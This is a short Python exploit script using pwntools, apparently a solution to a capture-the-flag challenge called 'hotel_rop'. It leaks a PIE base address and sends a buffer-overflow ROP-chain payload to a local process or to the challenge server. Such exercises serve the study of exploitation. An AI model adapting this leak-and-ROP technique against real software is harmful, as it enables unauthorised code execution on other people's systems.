from pwn import *
from sys import *

elf = ELF('hotel_rop')

p = process('./hotel_rop')
HOST = 'dctf1-chall-hotel-rop.westeurope.azurecontainer.io'
PORT = 7480

cmd = """
b*main
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

ret = 0x0000000000001016
pop_rdi = 0x000000000000140b

p.recvuntil('street ')
pie = eval(p.recvline().rstrip()) - 0x136d
print(hex(pie))
payload = b'A'*24
payload += p64(0xdeadbeef)*2
payload += p64(elf.sym['california']+pie)
payload += p64(elf.sym['silicon_valley']+pie)
payload += p64(ret+pie)*2
payload += p64(0x00000000000011C3+pie)
p.sendline(payload)
p.interactive()
p.interactive()